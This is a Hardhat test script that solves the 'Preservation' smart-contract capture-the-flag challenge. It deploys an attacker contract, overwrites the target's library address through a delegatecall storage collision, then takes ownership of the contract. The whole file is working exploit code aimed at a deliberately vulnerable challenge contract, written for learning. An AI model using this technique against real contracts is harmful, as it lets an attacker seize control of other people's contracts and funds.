import { ethers } from "hardhat";
import { expect } from "chai";


describe("preservation", function() {
    it("should solve preservation challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        let targetABI = [
            "function owner() public view returns (address)",
            "function setFirstTime(uint _timeStamp) public",
            "function setSecondTime(uint _timeStamp) public",
            "function timeZone1Library() public view returns (address)",
        ];

        const targetAddr = "0xf65385cee903A0cD5bc4Fb4EF177625Ff05719c4";
        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);

        const proxyFactory = await ethers.getContractFactory("PreservationAttacker");
        const proxyCont = await proxyFactory.deploy();
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash) ;
        console.log("PreservationAttacker deployed at: " + proxyCont.deployTransaction.hash);

        /*
        * change firsttimelib address with setSecondTime function
        * I think gasEstimation is wrong because of the delegatecall
        * and this cost me 30 mins :/
        */

        let tx = await targetCont.setSecondTime(proxyCont.address, { gasLimit: 555555 }); 
        await tx.wait();
        console.log(tx);

        let libAddr = await targetCont.timeZone1Library();
        expect(libAddr).to.eq(proxyCont.address);

        // trigger setFirstTime function, it should call our attacker's setTime function 
        tx = await targetCont.setFirstTime(eoa.address, { gasLimit: 555555 });
        await tx.wait();
        console.log(tx);

        const owner = await targetCont.owner();
        expect(owner).to.eq(eoa.address);
    });
});